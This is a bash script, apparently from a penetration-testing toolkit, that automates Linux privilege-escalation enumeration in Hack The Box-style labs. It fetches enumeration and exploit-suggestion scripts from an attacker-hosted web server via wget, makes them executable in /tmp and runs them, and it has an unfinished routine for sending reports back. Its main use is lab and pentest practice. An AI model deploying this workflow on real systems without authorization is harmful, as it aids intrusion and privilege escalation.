#!/bin/bash

# TODO
# - make an interactive option
# - make adding/running tools modular:
# - add web server feature
# - upload reports back to host box 

# Colors
NC='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
ORANGE='\033[0;33m'

function banner () {
	echo -e "${BLUE}";
	echo "_   _ ___________ _____ _   _ _   ____  ___";
	echo "| | | |_   _| ___ \  ___| \ | | | | |  \/  |";
	echo "| |_| | | | | |_/ / |__ |  \| | | | | .  . |";
	echo "|  _  | | | | ___ \  __|| . \` | | | | |\/| |";
	echo "| | | | | | | |_/ / |___| |\  | |_| | |  | |";
	echo "\_| |_/ \_/ \____/\____/\_| \_/\___/\_|  |_/";
	echo -e "\n${ORANGE}By Solomon Sklash - solomonsklash@0xfeed.io ${NC}\n";
}

function usage () {
		echo -e "${GREEN} Usage:";
		echo -e "${GREEN}         ./htbenum.sh [update] IP port [directory]\n";
		echo -e "${GREEN}         htbenum is designed do Linux enumeration in environments like Hack The Box where ";
		echo -e "${GREEN}         you do not have direct internet access to download scripts and tools.\n";
		echo -e "${GREEN}         It will download enumeration and exploit suggestion scripts to a Linux host and ";
		echo -e "${GREEN}         automatically execute them, providing a saved text report for each tool. Simply ";
		echo -e "${GREEN}         upload htbenum.sh to a host, run with the IP and port of a webserver hosting the ";
		echo -e "${GREEN}         tools, and they will be downloaded to /tmp (or an optional user-defined directory) ";
		echo -e "${GREEN}         executed, with report output also being saved to /tmp or a custom directory.\n";
		echo -e "${GREEN}         Note: Before running this tool on the target host, make sure to run it locally with ";
		echo -e "${GREEN}         the update parameter in order to download all the necessary tools to the current ";
		echo -e "${GREEN}         directory. Then start a local webserver in the same directory to host the tools, e.g. ";
		echo -e "${GREEN}         \`python3 -m http.server 80\` or \`python -m SimpleHTTPServer 80\`.\n";
		echo -e "${GREEN} Parameters:";
		echo -e "${GREEN}         update - Download latest versions of each tool, overwriting any existing versions.";
		echo -e "${GREEN}         IP - IP address of the listening web server used to tools for download.";
		echo -e "${GREEN}         port - TCP port of the listening web server used to tools for download.";
		echo -e "${GREEN}         directory - custom download and report creation directory (default is /tmp).";
}

# Arguments
ARGS=$#;
IP="";
PORT="";
DIR="/tmp";
WEB="";
UPDATE="";
UPLOAD="";
# Python
PY2="";
PY3="";

while getopts ":hi:p:o:wur" opt; do
		case ${opt} in
				h )
						banner;
						usage;
						exit 0;
						;;
				i )
						IP=$OPTARG;
						if [[ "$IP" == "localhost"  ]]; then
								IP="127.0.0.1";
						fi
						;;
				p )
						PORT=$OPTARG;
						;;
				o )
						DIR=$OPTARG;
						;;
				w )
						WEB=1;
						;;
				u )
						UPDATE=1;
						;;
				r )
						UPLOAD=1;
						;;
				* ) # Invalid option
						echo -e "$RED""[!] Invalid Option: -$OPTARG" 1>&2;
						usage;
						exit 1;
						;;
		esac
done
shift $((OPTIND -1));

function update () {
		# Get all scripts, overwrite if they already exist
		echo -e "${GREEN}[i] Updating all tools...${NC}";
		# Enumeration scripts
		wget -nv "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;
		wget -nv "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh;
		wget -nv "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py;
		wget -nv "https://raw.githubusercontent.com/initstring/uptux/master/uptux.py" -O uptux.py;
		wget -nv "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py;
		# Exploit suggestion scripts
		wget -nv "https://raw.githubusercontent.com/belane/linux-soft-exploit-suggester/master/linux-soft-exploit-suggester.py" -O les-soft.py;
		wget -nv "https://raw.githubusercontent.com/offensive-security/exploit-database/master/files_exploits.csv" -O files_exploits.csv;
		wget -nv "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh;
		echo -e "${GREEN}[i] Update complete!${NC}";
		exit 0;
}

# Check Python versions available
function pycheck () {
		PY2=$(command -v python2);
		if [[ "$PY2" == "" ]]; then
			echo -e "${ORANGE}[!] Python 2 was not found, not all enumeration tools may run!${NC}";
		else
			echo -e "${GREEN}[i] Python 2 was found!${NC}";
		fi
		PY3=$(command -v python3);
		if [[ "$PY3" == "" ]]; then
			echo -e "${ORANGE}[!] Python 3 was not found, not all enumeration tools may run and local web server is unavailable!${NC}";
		else
			echo -e "${GREEN}[i] Python 3 was found!${NC}";
		fi
}

# Notifcation of tool starting
function start () {
	NAME=$1;
	echo -e "${GREEN}********************************************************************************${NC}";
	echo -e "${RED}$1 is starting!${RED}";
	echo -e "${GREEN}********************************************************************************${NC}";
	sleep 2;
}

# Notifcation of completed tool
function complete () {
	echo -e "${GREEN}********************************************************************************${NC}";
	echo -e "${RED}$1 has finished running!${RED}";
	echo -e "${GREEN}********************************************************************************${NC}";
	sleep 2;
}

# local web server 
function webserver () {
		if [[ "$PY3" == "" ]]; then
			echo -e "${RED}[!] Python 3 was not found, the web server cannot run. Exiting!${NC}";
			exit 1;
		else
			"$PY3" webserver.py "$IP" "$PORT";
		fi
}

# Download files
function download () {

		# Download first file, check for wget success code, exit if it failed
		echo -e "${GREEN}[*] Downloading enumeration scripts to /tmp!${NC}";
		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/lse.sh" -O "$DIR"/lse.sh;
		RETURN=$?;

		if [[ "$RETURN" -ne 0 ]]; then
				echo -e "${RED}[!] Failed to download first script, bailing out!${NC}";
				exit 1;
		else
				chmod +x "$DIR"/lse.sh;
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linenum.sh" -O "$DIR"/linenum.sh;
				chmod +x "$DIR"/linenum.sh;
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linuxprivchecker.py" -O "$DIR"/linuxprivchecker.py;
				chmod +x "$DIR"/linuxprivchecker.py;
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/uptux.py" -O "$DIR"/uptux.py;
				chmod +x "$DIR"/uptux.py;
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/suid3num.py" -O "$DIR"/suid3num.py;
				chmod +x "$DIR"/suid3num.py;

				# exploit suggestion tools
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les.sh" -O "$DIR"/les.sh;
				chmod +x "$DIR"/les.sh;
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les-soft.py" -O "$DIR"/les-soft.py;
				chmod +x "$DIR"/les-soft.py;
				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/files_exploits.csv" -O "$DIR"/files_exploits.csv;
		fi
}

# Run tools
function runtools () {

		echo -e "${ORANGE}[?] Run [a]ll, [n]o, [e]numeration, or [s]uggestion tools?${GREEN}";
		read -p "[?] a/n/e/s " answer
		echo -e "${NC}";
		if [[ ${answer} == "all" || ${answer} == "a" ]]; then
				start "Linux Smart Enumeration";
				"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
				complete "Linux Smart Enumeration";
				start "LinEnum";
				"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
				complete "LinEnum";
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
				elif [[ "$PY2" == "" ]]; then
						echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
				else
						start "linuxprivchecker";
						python "$DIR"/linuxprivchecker.py | tee "$DIR"/linuxprivchecker-report.txt;
						complete "linuxprivchecker";
				fi
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping Uptux!${NC}";
				else
						start "Uptux";
						python "$DIR"/uptux.py -n | tee uptux-report.txt;
						complete "Uptux";
				fi
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping Suid3num!${NC}";
				else
						start "Suid3num";
						python "$DIR"/suid3num.py | tee "$DIR"/suid3num-report.txt;
						complete "Suid3num";
				fi
				# Run exploit suggestion tools
				start "Linux Exploit Suggester";
				"$DIR"/les.sh | tee "$DIR"/les-report.txt;
				complete "Linux Exploit Suggester";
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping Linux Soft Exploit Suggester!${NC}";
				elif [[ "$PY2" == "" ]]; then
						echo -e "${ORANGE}[!] Python 2 was not found, skipping Linux Soft Exploit Suggester!${NC}";
				else
						start "Linux Soft Exploit Suggester";
						python -u "$DIR"/les-soft.py | tee "$DIR"/les-soft-report.txt;
						complete "Linux Soft Exploit Suggester";
				fi
		elif [[ ${answer} == "no" || ${answer} == "n" ]]; then
				echo -e "${GREEN}********************************************************************************${NC}";
				echo -e "${BLUE}Script complete! See $DIR for output.${NC}";
				echo -e "${GREEN}********************************************************************************${NC}";
				exit 0;
		elif [[ ${answer} == "enumeration" || ${answer} == "e" ]]; then
				start "Linux Smart Enumeration";
				"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
				complete "Linux Smart Enumeration";
				start "LinEnum";
				"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
				complete "LinEnum";
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
				elif [[ "$PY2" == "" ]]; then
						echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
				else
						start "linuxprivchecker";
						python "$DIR"/linuxprivchecker.py | tee "$DIR"/linuxprivchecker-report.txt;
						complete "linuxprivchecker";
				fi
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping Uptux!${NC}";
				else
						start "Uptux";
						python "$DIR"/uptux.py -n | tee uptux-report.txt;
						complete "Uptux";
				fi
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping Suid3num!${NC}";
				else
						start "Suid3num";
						python "$DIR"/suid3num.py | tee "$DIR"/suid3num-report.txt;
						complete "Suid3num";
				fi
		elif [[ ${answer} == "suggestion" || ${answer} == "s" ]]; then
				start "Linux Exploit Suggester";
				"$DIR"/les.sh | tee "$DIR"/les-report.txt;
				complete "Linux Exploit Suggester";
				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
						echo -e "${ORANGE}[!] No version of Python found, skipping Linux Soft Exploit Suggester!${NC}";
				elif [[ "$PY2" == "" ]]; then
						echo -e "${ORANGE}[!] Python 2 was not found, skipping Linux Soft Exploit Suggester!${NC}";
				else
						start "Linux Soft Exploit Suggester";
						python -u "$DIR"/les-soft.py | tee "$DIR"/les-soft-report.txt;
						complete "Linux Soft Exploit Suggester";
				fi
		fi
}

# Upload reports
function upload () {
	# Check for curl
	# zip up linenum-report before transferring
	# check that each file exists before uploading
	# 1. lse-report.txt
	# 2. linenum-report (zip this!) 
	# 3. linuxprivchecker-report.txt
	# 4. uptux-report.txt
	# 5. suid3num-report.txt
	# 6. les-report.txt
	# 7. les-soft-report.txt

	REPORTS=( "lse-report.txt" "linenum-report.tar.gz" "linuxprivchecker-report.txt" "uptux-report.txt" "suid3num-report.txt" "les-report.txt" "les-soft-report.txt" )


	CURL=$(command -v curl);
	if [[ "$CURL" == ""  ]]; then
			echo -e "${ORANGE}[!] curl not found, skipping report upload!${NC}";
	else
			echo -e "${BLUE}[*] Beginning report upload!${NC}";

			# tar up linenum-report
			if [[ -e "$DIR"/linenum-report ]]; then
					tar czf linenum-report.tar.gz "$DIR"/linenum-report;
			fi
			
			# upload each report
			for report in "${REPORTS[@]}"
			do
					if [[ -e "$DIR/$report" ]]; then
							# curl -X PUT -F
							echo "The report to upload is $report.";
					fi
			done
	fi
}

# Start main script execution

if [[ "$ARGS" -eq 0  ]]; then
		banner;
		usage;
		exit 0;
fi

banner;

if [[ "$UPDATE" -eq 1 ]]; then
		update;
fi

# Check for IP and port
if [[ "$IP" == "" || "$PORT" == "" ]]; then
		echo -e "${RED}[!] IP or port not provided!${NC}";
		exit 1;
fi

# Python check
pycheck;

if [[ "$WEB" -eq 1  ]]; then
	webserver;
else
	download;
	runtools;	
	if [[ "$UPLOAD" -eq 1  ]]; then
			upload;
	fi
fi

echo -e "${GREEN}********************************************************************************${NC}";
echo -e "${BLUE}Script complete! See $DIR for output.${NC}";
echo -e "${GREEN}********************************************************************************${NC}";
